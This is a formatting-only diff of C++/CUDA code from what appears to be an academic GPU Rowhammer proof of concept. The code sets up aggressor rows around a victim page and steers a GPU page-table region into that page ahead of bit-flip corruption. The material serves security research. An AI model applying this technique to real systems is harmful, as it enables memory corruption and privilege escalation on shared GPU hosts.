@@ -22,7 +22,7 @@ first_PT_region_test (int argc, char *argv[])
   const uint64_t skip = std::stoull (argv[2]);
 
   GPUBreachContext ctx;
-  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);
   if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: Memory Allocation is wrong\n");
@@ -30,7 +30,7 @@ first_PT_region_test (int argc, char *argv[])
     }
 
   uint8_t *temp;
-  size_t total_byte = get_memory_limit();
+  size_t total_byte = get_memory_limit ();
 
   /**
    * 1. First allocation will be a 4KB data Page eviction
@@ -47,7 +47,8 @@ first_PT_region_test (int argc, char *argv[])
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
       DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;
 
-      // Skip timing spikes. At 512, there should be evictions (4KB * 512 = 2MB)
+      // Skip timing spikes. At 512, there should be evictions (4KB * 512 =
+      // 2MB)
       if (i < skip || i % 512 == 0)
         continue;
 
@@ -77,10 +78,10 @@ static uint64_t
 load_rowhammer_bitflip_info (GPUBreachContext &ctx)
 {
   uint8_t *temp;
-  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
-  auto& agg_ptrs = ctx.step2_data.agg_ptrs;
-  auto& agg_row_list = ctx.step2_data.agg_row_list;
-  auto& agg_vec = ctx.step2_data.agg_vec;
+  auto &alloc_ptrs = ctx.step1_data.alloc_ptrs;
+  auto &agg_ptrs = ctx.step2_data.agg_ptrs;
+  auto &agg_row_list = ctx.step2_data.agg_row_list;
+  auto &agg_vec = ctx.step2_data.agg_vec;
   uint8_t *layout = (uint8_t *)alloc_ptrs[0];
 
   const uint64_t num_agg = ctx.bitflip_config.num_agg;
@@ -90,16 +91,20 @@ load_rowhammer_bitflip_info (GPUBreachContext &ctx)
   const uint64_t row_step = ctx.bitflip_config.row_step;
   const uint64_t num_rows = ctx.bitflip_config.num_rows;
   const bool left = ctx.bitflip_config.left;
-  const uint64_t agg_pat = std::stoull (ctx.bitflip_config.agg_pat, nullptr, 16);
+  const uint64_t agg_pat
+      = std::stoull (ctx.bitflip_config.agg_pat, nullptr, 16);
 
-  const std::string BREACH_ROOT = std::string(std::getenv("BREACH_ROOT"));
+  const std::string BREACH_ROOT = std::string (std::getenv ("BREACH_ROOT"));
 
-  if (BREACH_ROOT == std::string()) {
+  if (BREACH_ROOT == std::string ())
+    {
       std::cout << "BREACH_ROOT is not set" << std::endl;
       return 1;
-  }
-  std::ifstream row_set_file (BREACH_ROOT + "/gpuhammer/"
-                              "results/row_sets/" + ctx.bitflip_config.row_set_file);
+    }
+  std::ifstream row_set_file (BREACH_ROOT
+                              + "/gpuhammer/"
+                                "results/row_sets/"
+                              + ctx.bitflip_config.row_set_file);
   RowList rows = read_row_from_file (row_set_file, layout);
   row_set_file.close ();
 
@@ -111,16 +116,21 @@ load_rowhammer_bitflip_info (GPUBreachContext &ctx)
   /*              ← Left   Right →             */
   /* A       ...       A V A       ...       A */
   target_agg = get_aggressors_dir (rows, crit_agg, num_agg, row_step, left);
-  std::vector<uint64_t> temp_vec; temp_vec.push_back(vic_row);
+  std::vector<uint64_t> temp_vec;
+  temp_vec.push_back (vic_row);
 
-  // Calculate the start, end, and amount of the pages required for aggressor rows
+  // Calculate the start, end, and amount of the pages required for aggressor
+  // rows
   uint64_t first_hammer_page
       = static_cast<uint64_t> (rows[target_agg[0]][0] - layout) / ALLOC_SIZE;
   uint64_t victim_page
       = static_cast<uint64_t> (rows[vic_row][0] - layout) / ALLOC_SIZE;
   uint64_t to_reserve
-      = left ? victim_page - first_hammer_page : (static_cast<uint64_t> (rows[target_agg.back()][0] - layout) / ALLOC_SIZE) - victim_page; // Last page excluded.
-  
+      = left ? victim_page - first_hammer_page
+             : (static_cast<uint64_t> (rows[target_agg.back ()][0] - layout)
+                / ALLOC_SIZE)
+                   - victim_page; // Last page excluded.
+
   /**
    * Segragate aggressor row pages from the rest, using same insight as Paper
    * Section 4.3 Given our memory is full, freed physical memory is immediately
@@ -136,17 +146,17 @@ load_rowhammer_bitflip_info (GPUBreachContext &ctx)
       DBG_OUT << first_hammer_page + i << '\n';
     }
 
-  /* We reconfigure the aggressor row addresses using the new virtual addresses */
+  /* We reconfigure the aggressor row addresses using the new virtual addresses
+   */
   auto offset_map = get_relative_aggressor_offset (rows, target_agg, layout);
-  auto row_agg_pair
-      = get_aggressor_rows_from_offset (agg_ptrs, offset_map);
+  auto row_agg_pair = get_aggressor_rows_from_offset (agg_ptrs, offset_map);
   set_rows (row_agg_pair.first, row_agg_pair.second, agg_pat, step);
   cudaDeviceSynchronize ();
 
   agg_row_list = row_agg_pair.first;
   agg_vec = row_agg_pair.second;
   if (!left)
-    std::reverse(agg_vec.begin(), agg_vec.end());
+    std::reverse (agg_vec.begin (), agg_vec.end ());
 
   return victim_page;
 }
@@ -158,13 +168,14 @@ first_PT_region (int argc, char *argv[])
   const double threshold = std::stod (argv[1]);
   const uint64_t skip = std::stoull (argv[2]);
   GPUBreachContext ctx;
-  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);
 
   return first_PT_region (num_alloc_init, threshold, skip, ctx);
 }
 
 bool
-first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBreachContext &ctx)
+first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip,
+                 GPUBreachContext &ctx)
 {
   if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
     {
@@ -172,7 +183,7 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
       exit (1);
     }
 
-  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
+  auto &alloc_ptrs = ctx.step1_data.alloc_ptrs;
   auto victim_page = load_rowhammer_bitflip_info (ctx);
 
   /****************************************************************/
@@ -182,7 +193,7 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
   std::vector<uint8_t *> misc_ptrs;
   uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
   uint64_t next_id = ERR_next_id;
-  
+
   for (uint64_t i = 0; i < num_alloc_init; i += 1)
     {
       // Evict vicimt page to create free space for PT Region
@@ -200,30 +211,31 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
       if (i < skip || i % 512 == 0)
         continue;
 
-      // PT region now in the victim page, can break. 
+      // PT region now in the victim page, can break.
       if (i == next_id)
         break;
-      
+
       // Found spike, set when the next spike will happen.
       if (currentMS > threshold && next_id == ERR_next_id)
         next_id = i + 508;
     }
 
-  if (debug_enabled())
-  {
-    std::cout << "(Step 2 Done) First PT Region Generated: Press "
-               "\033[1;32mEnter Key\033[0m to continue... "
-            << '\n';
-    paused ();
-  }
+  if (debug_enabled ())
+    {
+      std::cout << "(Step 2 Done) First PT Region Generated: Press "
+                   "\033[1;32mEnter Key\033[0m to continue... "
+                << '\n';
+      paused ();
+    }
   else
-  {
-    std::cout << "(Step 2 Done) First PT Region Generated\n";
-  }
+    {
+      std::cout << "(Step 2 Done) First PT Region Generated\n";
+    }
 
   /****************************************************************/
 
-  /* Free up GPU/CPU memory by releasing the evicted memories and prior memories */
+  /* Free up GPU/CPU memory by releasing the evicted memories and prior
+   * memories */
   cudaFree (alloc_ptrs[0]);
   alloc_ptrs.clear ();
 
